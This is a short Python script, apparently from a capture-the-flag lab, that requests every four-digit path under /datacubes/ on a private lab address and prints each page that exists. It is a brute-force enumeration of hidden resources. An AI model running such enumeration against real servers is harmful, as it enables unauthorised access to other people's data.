import requests

target = "10.10.126.246"

for i in range(0, 10000):
    r = requests.get(f"http://{target}/datacubes/" + format(i, '04'))
    if r.status_code == 200:
        print(format(i, '04') + '\n' + r.text)
